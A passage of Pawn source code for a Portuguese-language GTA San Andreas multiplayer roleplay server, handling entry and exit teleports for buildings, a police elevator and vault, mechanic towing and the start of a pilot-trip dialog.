	   	     			format(gstring, sizeof(gstring), "Você está na Empresa ID %d - %s, que pertence a %s", EmpresaInfo[m][Numero], EmpresaInfo[m][NomeEmp], EmpresaInfo[m][Proprietario]);
						SendClientMessage(playerid, 0x1E90FFAA, gstring);
					}
					EntrouEmpresa[playerid] = 1;
					new
					    nome_empresa[24]
					;
					format(nome_empresa, 24, "~w~~h~%s", EmpresaInfo[m][NomeEmp]);
					GameTextForPlayer(playerid, nome_empresa, 1000, 1);
	              	return 1;
                }
			}
			if(EntrouEmpresa[playerid] == 1)
			{
	      		if(IsPlayerInRangeOfPoint(playerid, 2.0, EmpresaInfo[m][InteriorX], EmpresaInfo[m][InteriorY], EmpresaInfo[m][InteriorZ]))
	        	{
	 				if(InCompanyPickup[playerid] == -1)
		 			{
		 			    SendClientMessage(playerid, COR_ERRO, "Você não está em uma empresa!");
					 	return 1;
					}
	   				SetPlayerVirtualWorld(playerid, 0);
	     			SetPlayerInterior(playerid, 0);
					SetPlayerPos(playerid, EmpresaInfo[InCompanyPickup[playerid]][PickupX], EmpresaInfo[InCompanyPickup[playerid]][PickupY], EmpresaInfo[InCompanyPickup[playerid]][PickupZ]);
					EntrouEmpresa[playerid] = 0;
         			InCompanyPickup[playerid] = -1;
					return 1;
				}
			}
		}
  		if(IsPlayerInRangeOfPoint(playerid,1.0,1568.8434,-1657.9930,16.2304) && getPolicial(playerid))
		{
			if(pInfo[playerid][Preso] > 0)
			{
				SendClientMessage(playerid,COR_ERRO,"Você está preso(a)!");
			}
			MoveObject(elevadordp,1570.57593, -1655.18555, 17.09180, 50.0,   0.00000, 0.00000, 90.00000);
		    MoveObject(portaelevador[0],1572.11816, -1655.40735, 17.12820, 3.0,  0.00000, 0.00000, 90.00000);
			MoveObject(portaelevador[1],1567.10999, -1655.41528, 17.12820, 3.0,  0.00000, 0.00000, 90.00000);
			SendClientMessage(playerid,-1,"O elevador descerá para o andar das celas em 3 segundos.");
			SetTimer("DescerElevador", 3000, false);
			SetTimer("FecharElevador", 3000, false);
		}
		if(IsPlayerInRangeOfPoint(playerid,1.0,1572.1257,-1656.4021,2.1800) && getPolicial(playerid))
		{
	    	if(pInfo[playerid][Preso] > 0)
			{
				SendClientMessage(playerid,COR_ERRO,"Você está preso(a)!");
				return 1;
			}
			MoveObject(elevadordp,1570.57593, -1655.18555, 17.09180, 3.0,   0.00000, 0.00000, 90.00000);
			SendClientMessage(playerid,-1,"Você está subindo para o andar principal.");
			SetTimer("AbrirElevador", 4000, false);
			SetTimer("FecharElevador", 7000, false);
		  	return 1;
		}
  		if(IsPlayerInRangeOfPoint(playerid,2.0,1572.1202,-1656.6772,16.2918) && getPolicial(playerid))
		{
			if(pInfo[playerid][Preso] > 0)
			{
				SendClientMessage(playerid,COR_ERRO,"Você está preso(a)!");
				return 1;
			}
		    MoveObject(portaelevador[0],1572.11816, -1655.40735, 17.12820, 3.0,  0.00000, 0.00000, 90.00000);
			MoveObject(portaelevador[1],1567.10999, -1655.41528, 17.12820, 3.0,  0.00000, 0.00000, 90.00000);
			SendClientMessage(playerid,-1,"Portas abertas.");
			SetTimer("FecharElevador",3000,false);
		  	return 1;
		}
  		if(IsPlayerInRangeOfPoint(playerid,2.0,1568.6885,-1657.6062,2.0466))
		{
			if(pInfo[playerid][Preso] > 0)
			{
				SendClientMessage(playerid,COR_ERRO,"Você está preso(a)!");
				return 1;
			}
			MoveObject(elevadordp, 1570.57593, -1655.18555, 2.98000, 3.0,   0.00000, 0.00000, 90.00000);
			SendClientMessage(playerid,-1,"Você chamou o elevador.");
		  	return 1;
		}
		if(IsPlayerInRangeOfPoint(playerid, 1.0, 1551.5126,-1616.4089,13.3828)) // Para o pátio
		{
		    SetPlayerPos(playerid, 1578.8885,-1663.0897,2.0466);
		    SetPlayerInterior(playerid, 0);
		    GameTextForPlayer(playerid, "~w~Prisao", 3000, 1);
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1578.8885,-1663.0897,2.0466)) // Para o pátio
		{
		    SetPlayerPos(playerid, 1551.5126,-1616.4089,13.3828);
		    SetPlayerFacingAngle(playerid,358.0025);
		    SetPlayerInterior(playerid, 0);
		    GameTextForPlayer(playerid, "~w~Patio", 3000, 1);
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 1.0, 2235.7280,-1334.2772,24.0924))
		{
		    SetPlayerPos(playerid, 2232.8218,-1333.2921,23.9816);
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 1.0, 2232.8218,-1333.2921,23.9816))
		{
		    SetPlayerPos(playerid, 2235.7280,-1334.2772,24.0924);
		    SetPlayerFacingAngle(playerid, 268.8935);
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		if(pInfo[playerid][EntrouL] == false) // Entradas
		{
			if(IsPlayerInRangeOfPoint(playerid, 1.0, 1555.1055, -1675.6426, 16.1953)) // Delegacia LS
			{
			    SetPlayerPos(playerid, 1560.7961,-1675.6205,16.2505);
			    SetPlayerFacingAngle(playerid, 348.9244);
		      	pInfo[playerid][EntrouL] = true;
		      	SetCameraBehindPlayer(playerid);
		      	pInfo[playerid][entrouDEL] = 1;
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, -1605.4912, 711.4242, 13.8672)) // Delegacia SF
			{
       			SetPlayerPos(playerid, 246.8718, 62.3202, 1003.6406);
			    SetPlayerFacingAngle(playerid, 348.9244);
			    SetPlayerInterior(playerid, 6);
			    SetPlayerVirtualWorld(playerid, 1);
		      	pInfo[playerid][EntrouL] = true;
		      	SetCameraBehindPlayer(playerid);
		      	pInfo[playerid][entrouDEL] = 2;
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1836.5631, -1682.5184, 13.3427)) // Alhambra
			{
			    SetPlayerPos(playerid, 493.4367, -24.9197, 1000.6719);
			    SetPlayerInterior(playerid, 17);
			    pInfo[playerid][EntrouL] = true;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 625.7263, -2244.6213, 13.1349)) // Cruzeiro LS
			{
			    SetPlayerPos(playerid, 1100.1354, 243.8890, 527.3731+1);
			    SetPlayerFacingAngle(playerid, 268.7034);
			    SetPlayerInterior(playerid, 0);
			    pInfo[playerid][EntrouL] = true;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1310.4525,-1367.4639,13.4724)) // Agência LS
			{
			    SetPlayerPos(playerid, 246.375991,109.245994,1003.218750);
			    SetPlayerFacingAngle(playerid, 359.6873);
			    SetPlayerInterior(playerid, 10);
			    pInfo[playerid][EntrouL] = true;
			    pInfo[playerid][EntrouAgencia] = 1;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, -2227.2854, 251.9700, 35.3203)) // Agência SF
			{
			    SetPlayerPos(playerid, 246.375991,109.245994,1003.218750);
			    SetPlayerFacingAngle(playerid, 359.6873);
			    SetPlayerInterior(playerid, 10);
			    pInfo[playerid][EntrouL] = true;
			    pInfo[playerid][EntrouAgencia] = 2;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1952.8214, 1342.8403, 15.3672)) // Agência LV
			{
			    SetPlayerPos(playerid, 246.375991,109.245994,1003.218750);
			    SetPlayerFacingAngle(playerid, 359.6873);
			    SetPlayerInterior(playerid, 10);
			    pInfo[playerid][EntrouL] = true;
			    pInfo[playerid][EntrouAgencia] = 3;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, -206.9538,1119.1993,20.4297)) // Agência de Fort Carson
			{
			    SetPlayerPos(playerid, 246.375991,109.245994,1003.2187502);
			    SetPlayerFacingAngle(playerid, 359.6873);
			    SetPlayerInterior(playerid, 10);
			    pInfo[playerid][EntrouL] = true;
			    pInfo[playerid][EntrouAgencia] = 4;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
	 		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 207.8856, -62.8081, 1.5781)) // Agência de Blueberry
			{
			    SetPlayerPos(playerid, 246.375991,109.245994,1003.218750);
			    SetPlayerFacingAngle(playerid, 359.6873);
			    SetPlayerInterior(playerid, 10);
			    SetPlayerVirtualWorld(playerid, 1);
			    pInfo[playerid][EntrouL] = true;
			    pInfo[playerid][EntrouAgencia] = 5;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
	  		else if(IsPlayerInRangeOfPoint(playerid, 1.0, -2130.4309,-2434.8296,30.6250)) // Agência de Angel Pine
			{
				SetPlayerPos(playerid, 246.375991,109.245994,1003.218750);
				SetPlayerFacingAngle(playerid, 359.6873);
			    SetPlayerInterior(playerid, 10);
			    pInfo[playerid][EntrouL] = true;
			    pInfo[playerid][EntrouAgencia] = 6;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1771.2506,-1695.4211,13.5089))
			{
			    if(pInfo[playerid][Prof] == GUARDA_TRANSITO || pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_RODOVIARIO || pInfo[playerid][Prof] == POL_FEDERAL || pInfo[playerid][Prof] == EXERCITO)
			    {
			        if(CofreAberto == false)
			        {
			        	SendClientMessage(playerid, AZUL_WE, "Cofre aberto!");
			        	MoveObject(Vault, 1769.60217, -1693.44482, 13.94880, 1.0,  0.00000, 0.00000, -180.00000);
			        	CofreAberto = true;
			        	SetTimer("VaultTempo",5000,false);
			        	return 1;
					}
				}
			}
	 		else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1958.3718, 951.9951, 10.8203)) // Banco LV
			{
				SetPlayerPos(playerid, 1247.8998, -857.9455, 1086.4293+1);
  				SetPlayerFacingAngle(playerid, 135.9976);
			    SetPlayerInterior(playerid, 0);
			    pInfo[playerid][EntrouL] = true;
			    pInfo[playerid][EntrouAgencia] = 1;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
	 		else if(IsPlayerInRangeOfPoint(playerid, 1.0, -2425.3201, 337.5206, 37.0020)) // Banco SF
			{
			    SetPlayerPos(playerid, 1247.8998, -857.9455, 1086.4293+1);
		    	SetPlayerFacingAngle(playerid, 135.9976);
			    SetPlayerInterior(playerid, 0);
			    pInfo[playerid][EntrouL] = true;
			    pInfo[playerid][EntrouAgencia] = 2;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1657.9943, -1343.3003, 17.4365)) // Auto Escola LS
			{
			    SetPlayerPos(playerid, -2026.8789, -103.6022, 1035.1833);
			    SetPlayerInterior(playerid, 3);
			    pInfo[playerid][entrouHAB] = 1;
			    pInfo[playerid][EntrouL] = true;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, -2026.6133, -100.9539, 35.1641)) // Auto Escola SF
			{
			    SetPlayerPos(playerid, -2026.8789, -103.6022, 1035.1833);
			    SetPlayerInterior(playerid, 3);
			    pInfo[playerid][entrouHAB] = 2;
			    pInfo[playerid][EntrouL] = true;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1352.4087, -1759.2499, 13.5078)) // 24/7
			{
			    SetPlayerPos(playerid, -25.8498, -188.2523, 1003.5469);
			    SetPlayerInterior(playerid, 17);
			    pInfo[playerid][EntrouL] = true;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1169.9524, -1489.6898, 22.7558)) // 24/7²
			{
			    SetPlayerPos(playerid, -25.8498, -188.2523, 1003.5469);
			    SetPlayerInterior(playerid, 17);
			    SetPlayerVirtualWorld(playerid, 24);
			    pInfo[playerid][EntrouL] = true;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1631.8516, -1172.9270, 24.0843)) // Loterica
			{
			    SetPlayerPos(playerid, -2158.6572, 643.1335, 1052.3750);
			    SetPlayerInterior(playerid, 1);
			    pInfo[playerid][EntrouL] = true;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 2244.3889, -1665.5635, 15.4766)) // Binco
			{
			    SetPlayerPos(playerid, 203.8940, -48.9065, 1001.8047);
			    SetPlayerFacingAngle(playerid, 0.0387);
			    SetPlayerInterior(playerid, 1);
			    SetCameraBehindPlayer(playerid);
			    pInfo[playerid][EntrouL] = true;
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 2229.8167, -1721.1733, 13.5603)) // Academia
			{
			    SetPlayerPos(playerid, 773.9420, -78.8449, 1000.6628);
			    SetPlayerInterior(playerid, 7);
	            pInfo[playerid][EntrouL] = true;
	            SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 2421.6262, -1219.2485, 25.5610)) // Puteiro
			{
			    SetPlayerPos(playerid, 1204.7864, -13.8520, 1000.9219);
			    SetPlayerInterior(playerid, 2);
			    pInfo[playerid][EntrouL] = true;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 2310.1558, -1643.6486, 14.8270)) // Bar da Grove
			{
			    SetPlayerPos(playerid, 501.9589, -67.5634, 998.7578);
			    SetPlayerInterior(playerid, 11);
			    pInfo[playerid][EntrouL] = true;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 2105.4834, -1806.5027, 13.554)) // Pizzaria
			{
			    SetPlayerPos(playerid, 372.2989, -133.5238, 1001.4922);
			    SetPlayerInterior(playerid, 5);
			    pInfo[playerid][EntrouL] = true;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1199.2562, -918.1423, 43.1232)) // Burger Shot
			{
			    SetPlayerPos(playerid, 362.7990, -75.0967, 1001.5078);
			    SetPlayerInterior(playerid, 10);
			    pInfo[playerid][EntrouL] = true;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 928.9155, -1352.9719, 13.3438)) // Cluckin'Bell
			{
			    SetPlayerPos(playerid, 365.0023, -11.8438, 1001.8516);
			    SetPlayerInterior(playerid, 9);
			    pInfo[playerid][EntrouL] = true;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1481.0233,-1771.7765,18.7957)) // Prefeitura LS
			{
			    SetPlayerPos(playerid, 380.0053, 173.6629, 1008.3828);
				SetPlayerFacingAngle(playerid, 92.4343);
			    SetPlayerInterior(playerid, 3);
			    pInfo[playerid][entroupref] = 1;
			    pInfo[playerid][EntrouL] = true;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, -2765.3511, 375.5041, 6.3359)) // Prefeitura SF
			{
			    SetPlayerPos(playerid, 380.0053, 173.6629, 1008.3828);
				SetPlayerFacingAngle(playerid, 92.4343);
			    SetPlayerInterior(playerid, 3);
			    pInfo[playerid][entroupref] = 2;
			    pInfo[playerid][EntrouL] = true;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
	 		else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1367.1837, -1279.7854, 13.5469)) // Ammunation
			{
				SetPlayerPos(playerid, 314.820984,-141.431991,999.601562);
				SetPlayerInterior(playerid, 7);
			    pInfo[playerid][EntrouL] = true;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			return 1;
		}
		else if(pInfo[playerid][EntrouL] == true) // Saídas
		{
			if(IsPlayerInRangeOfPoint(playerid, 1.0, 246.8718, 62.3202, 1003.6406)) // Delegacias
			{
			    if(pInfo[playerid][entrouDEL] == 2) // SF
			    {
				    SetPlayerPos(playerid, -1606.0313, 717.9035, 12.0699);
			    	SetPlayerFacingAngle(playerid, 359.8679);
				    SetPlayerInterior(playerid, 0);
				    SetPlayerVirtualWorld(playerid, 0);
				    GameTextForPlayer(playerid, "~w~San Fierro", 3000, 1);
			    }
			    pInfo[playerid][entrouDEL] = 0;
			    pInfo[playerid][EntrouL] = false;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0,1560.7961,-1675.6205,16.2505))
			{
	    		SetPlayerPos(playerid, 1553.2599,-1675.5905,16.1953);
	    		SetPlayerFacingAngle(playerid, 89.4814);
			    SetPlayerInterior(playerid, 0);
			    GameTextForPlayer(playerid, "~w~Los Santos", 3000, 1);
			    pInfo[playerid][entrouDEL] = 0;
			    pInfo[playerid][EntrouL] = false;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0,493.4367, -24.9197, 1000.6719)) // Alhambra
			{
			    SetPlayerPos(playerid, 1836.5631, -1682.5184, 13.3427);
			    SetPlayerInterior(playerid, 0);
			    pInfo[playerid][EntrouL] = false;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 2.0, 246.4077, 107.6076, 1003.2188)) // Agência
			{
				if(pInfo[playerid][EntrouAgencia] == 1)
			    {
				    SetPlayerPos(playerid, 1310.3708,-1370.8752,13.5204); // LS
				    SetPlayerFacingAngle(playerid, 181.6691);
				    SetPlayerInterior(playerid, 0);
				    pInfo[playerid][EntrouL] = false;
				    pInfo[playerid][EntrouAgencia] = 0;
				    GameTextForPlayer(playerid, "~w~Los Santos", 3000, 1);
			    }
			    else if(pInfo[playerid][EntrouAgencia] == 2)
			    {
				    SetPlayerPos(playerid, -2227.2854, 251.9700, 35.3203);
			    	SetPlayerFacingAngle(playerid, 317.8766);
				    SetPlayerInterior(playerid, 0);
				    pInfo[playerid][EntrouL] = false;
				    pInfo[playerid][EntrouAgencia] = 0;
				    GameTextForPlayer(playerid, "~w~San Fierro", 3000, 1);
			    }
			    else if(pInfo[playerid][EntrouAgencia] == 3)
			    {
				    SetPlayerPos(playerid, 1952.8214, 1342.8403, 15.3672); // LV
		    		SetPlayerFacingAngle(playerid, 269.9011);
				    SetPlayerInterior(playerid, 0);
				    pInfo[playerid][EntrouL] = false;
				    pInfo[playerid][EntrouAgencia] = 0;
				    GameTextForPlayer(playerid, "~w~Las Venturas", 3000, 1);
			    }
	   		    else if(pInfo[playerid][EntrouAgencia] == 4)
			    {
				    SetPlayerPos(playerid, -206.9538,1119.1993,20.4297); // FC
				    SetPlayerFacingAngle(playerid, 140.0);
				    SetPlayerInterior(playerid, 0);
				    pInfo[playerid][EntrouL] = false;
				    pInfo[playerid][EntrouAgencia] = 0;
				    GameTextForPlayer(playerid, "~w~Fort Carson", 3000, 1);
			    }
	      		else if(pInfo[playerid][EntrouAgencia] == 5)
			    {
				    SetPlayerPos(playerid, 207.8856, -62.8081, 1.5781); // Blueberry
				    SetPlayerFacingAngle(playerid, 179.2190);
				    SetPlayerInterior(playerid, 0);
				    pInfo[playerid][EntrouL] = false;
				    pInfo[playerid][EntrouAgencia] = 0;
				    GameTextForPlayer(playerid, "~w~Blueberry", 3000, 1);
			    }
	      		else if(pInfo[playerid][EntrouAgencia] == 6)
			    {
				    SetPlayerPos(playerid, -2130.4309,-2434.8296,30.6250); // Angel Pine
				    SetPlayerFacingAngle(playerid, 233.7247);
				    SetPlayerInterior(playerid, 0);
				    pInfo[playerid][EntrouL] = false;
				    pInfo[playerid][EntrouAgencia] = 0;
				    GameTextForPlayer(playerid, "~w~Angel Pine", 3000, 1);
			    }
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1247.8998, -857.9455, 1086.4293)) // Banco
			{
			    if(pInfo[playerid][EntrouAgencia] == 1)
			    {
				    SetPlayerPos(playerid, 2127.5425, 2378.9783, 10.8203);
				    SetPlayerInterior(playerid, 0);
				    pInfo[playerid][EntrouL] = false;
				    pInfo[playerid][EntrouAgencia] = 0;
				    GameTextForPlayer(playerid, "~w~Las Venturas", 3000, 1);
			    }
			    else if(pInfo[playerid][EntrouAgencia] == 2)
			    {
				    SetPlayerPos(playerid, -2425.3201, 337.5206, 37.0020);
			    	SetPlayerFacingAngle(playerid, 87.8926);
				    SetPlayerInterior(playerid, 0);
				    pInfo[playerid][EntrouL] = false;
				    pInfo[playerid][EntrouAgencia] = 0;
				    GameTextForPlayer(playerid, "~w~San Fierro", 3000, 1);
			    }
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, -2026.8789, -103.6022, 1035.1833)) // Auto Escola
			{
			    if(pInfo[playerid][entrouHAB] == 1)
			    {
				    SetPlayerPos(playerid, 1657.9943, -1343.3003, 17.4365); // LS
				    SetPlayerInterior(playerid, 0);
				    GameTextForPlayer(playerid, "~w~Los Santos", 3000, 1);
			    }
			    if(pInfo[playerid][entrouHAB] == 2)
			    {
				    SetPlayerPos(playerid, -2026.6133, -100.9539, 35.1641); // SF
				    SetPlayerFacingAngle(playerid, 0.2082);
				    SetPlayerInterior(playerid, 0);
				    GameTextForPlayer(playerid, "~w~San Fierro", 3000, 1);
			    }
			    pInfo[playerid][EntrouL] = false;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, -25.8498, -188.2523, 1003.5469)) // 24/7 e 24/7²
			{
			    if(GetPlayerVirtualWorld(playerid) == 24)
			    {
			    	SetPlayerPos(playerid, 1169.9524, -1489.6898, 22.7558);
			    	SetPlayerInterior(playerid, 0);
			    	SetPlayerVirtualWorld(playerid, 0);
			    	pInfo[playerid][EntrouL] = false;
			    }
			    else if(GetPlayerVirtualWorld(playerid) == 0)
			    {
			    	SetPlayerPos(playerid, 1352.4087, -1759.2499, 13.5078);
			    	SetPlayerInterior(playerid, 0);
			    	pInfo[playerid][EntrouL] = false;
			    }
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, -2158.6572, 643.1335, 1052.3750)) // Loterica
			{
			    SetPlayerPos(playerid, 1631.8516, -1172.9270, 24.0843);
			    SetPlayerInterior(playerid, 0);
			    pInfo[playerid][EntrouL] = false;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1100.1354, 243.8890, 527.3731)) // Cruzeiro LS
			{
			    SetPlayerPos(playerid, 625.7263, -2244.6213, 13.1349);
			    SetPlayerInterior(playerid, 0);
			    pInfo[playerid][EntrouL] = false;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 203.7462, -50.6643, 1001.8047)) // Binco
			{
			    if(EntrouEmpresa[playerid] == 0)
			    {
				    SetPlayerPos(playerid, 2244.3889, -1665.5635, 15.4766);
				    SetPlayerInterior(playerid, 0);
				    pInfo[playerid][EntrouL] = false;
				    SetCameraBehindPlayer(playerid);
			    }
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 773.9420, -78.8449, 1000.6628)) // Academia
			{
			    SetPlayerPos(playerid, 2229.8167, -1721.1733, 13.5603);
			    SetPlayerInterior(playerid, 0);
	            pInfo[playerid][EntrouL] = false;
	            SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1204.7864, -13.8520, 1000.9219)) // Puteiro
			{
			    SetPlayerPos(playerid, 2421.6262, -1219.2485, 25.5610);
			    SetPlayerInterior(playerid, 0);
			    pInfo[playerid][EntrouL] = false;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 501.9589, -67.5634, 998.7578)) // Bar da Grove
			{
			    SetPlayerPos(playerid, 2310.1558, -1643.6486, 14.8270);
			    SetPlayerInterior(playerid, 0);
			    pInfo[playerid][EntrouL] = false;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 372.2989, -133.5238, 1001.4922)) // Pizzaria
			{
			    SetPlayerPos(playerid, 2105.4834, -1806.5027, 13.554);
			    SetPlayerInterior(playerid, 0);
			    pInfo[playerid][EntrouL] = false;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 362.7990, -75.0967, 1001.5078)) // Burger Shot
			{
			    SetPlayerPos(playerid, 1199.2562, -918.1423, 43.1232);
			    SetPlayerInterior(playerid, 0);
			    pInfo[playerid][EntrouL] = false;
			    SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 365.0023, -11.8438, 1001.8516)) // Cluckin'Bell
			{
			    SetPlayerPos(playerid, 928.9155, -1352.9719, 13.3438);
			    SetPlayerInterior(playerid, 0);
	            pInfo[playerid][EntrouL] = false;
	            SetCameraBehindPlayer(playerid);
			    return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 1.0, 390.0609, 173.7708, 1008.3828)) // Prefeitura
			{
			    if(pInfo[playerid][entroupref] == 1)
			    {
				    SetPlayerPos(playerid, 1481.0470,-1767.6028,18.7957); // LS
				    SetPlayerFacingAngle(playerid, 359.0867);
				    SetPlayerInterior(playerid, 0);
		            pInfo[playerid][EntrouL] = false;
		            SetCameraBehindPlayer(playerid);
		            GameTextForPlayer(playerid, "~w~Los Santos", 3000, 1);
	            }
	            if(pInfo[playerid][entroupref] == 2)
			    {
				    SetPlayerPos(playerid, -2763.0068, 375.6516, 5.8614); // SF
				    SetPlayerFacingAngle(playerid, 269.5799);
				    SetPlayerInterior(playerid, 0);
		            pInfo[playerid][EntrouL] = false;
		            SetCameraBehindPlayer(playerid);
		            GameTextForPlayer(playerid, "~w~San Fierro", 3000, 1);
	            }
	            pInfo[playerid][entroupref] = 0;
			    return 1;
			}
	 		else if(IsPlayerInRangeOfPoint(playerid, 1.0, 314.820983,-141.431991,999.601562)) // Ammu
			{
			    SetPlayerPos(playerid, 1367.1837, -1279.7854, 13.5469);
			    SetPlayerInterior(playerid, 0);
	            pInfo[playerid][EntrouL] = false;
	            SetCameraBehindPlayer(playerid);
			    return 1;
			}
		}
	}
	if((newkeys == KEY_ACTION) && (IsPlayerInAnyVehicle(playerid)) && (GetPlayerState(playerid) == PLAYER_STATE_DRIVER))
 	{
 	    if(pInfo[playerid][Prof] == MECANICO || aInfo[playerid][Admin] == 1)
 	    {
		    if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 525)
			{
				new
					Float:pX,
					Float:pY,
					Float:pZ
				;
				GetPlayerPos(playerid, pX, pY, pZ);
				new
					Float:vX,
				    Float:vY,
					Float:vZ
				;
				new
					Found = 0
				;
				new
					vid = 0
				;
				while((vid < MAX_VEHICLES) && (!Found))
				{
	   				vid++;
	   				GetVehiclePos(vid, vX, vY, vZ);
	   				if ((floatabs(pX-vX) < 7.0) && (floatabs(pY-vY) < 7.0) && (floatabs(pZ-vZ) < 7.0) && (vid != GetPlayerVehicleID(playerid)))
	   				{
	   				    Found = 1;
	   				    if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
	   					{
	   				        DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
	   					}
	   				    AttachTrailerToVehicle(vid, GetPlayerVehicleID(playerid));
	   				    SendClientMessage(playerid, COR_AMARELO,"Veículo guinchado com sucesso!");
	   				}
	       		}
				if(!Found)
				{
				    SendClientMessage(playerid, COR_ERRO, "Não à nenhum veículo para você guinchar!");
				}
			}
		}
		return 1;
	}
	return 1;
}

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	if(dialogid == D_PILOTO)
	{
		if(response)
		{
			switch(listitem)
			{
				case 0:
				{
					TogglePlayerControllable(playerid, 0);
					if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 511)
					{
						if(WE_GetInt(f(playerid), "ViagensPiloto") < 25)
						{
							SendClientMessage(playerid, COR_PILOTO, "Você iniciou uma viagem para Las Venturas no Beagle!");
							SendClientMessage(playerid, COR_PILOTO, "Cada passageiro entra a cada 6 segundos e tem o valor de {00FF00}R$130{7FFFD4} e o máximo de 10 passageiros!");
							SendClientMessage(playerid, COR_PILOTO, "Se quiser decolar digite {FF0000}/Decolagem{7FFFD4}.");
							ViagemPiloto[playerid] = 1;
							PassageirosPiloto[playerid] = 0;
							TimerPiloto[playerid] = SetTimerEx("CarregarPassageiros", 5000, true, "ii", playerid, 1);
					    }
					}
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 519)
					{
						if(WE_GetInt(f(playerid), "ViagensPiloto") >= 25)
						{
							SendClientMessage(playerid, COR_PILOTO, "Você iniciou uma viagem para Las Venturas no Shamal!");
							SendClientMessage(playerid, COR_PILOTO, "Cada passageiro entra a cada 6 segundos e tem o valor de {00FF00}R$130{7FFFD4} e o máximo de 15 passageiros!");
							SendClientMessage(playerid, COR_PILOTO, "Se quiser decolar digite {FF0000}/Decolagem{7FFFD4}.");
							ViagemPiloto[playerid] = 2;
							PassageirosPiloto[playerid] = 0;
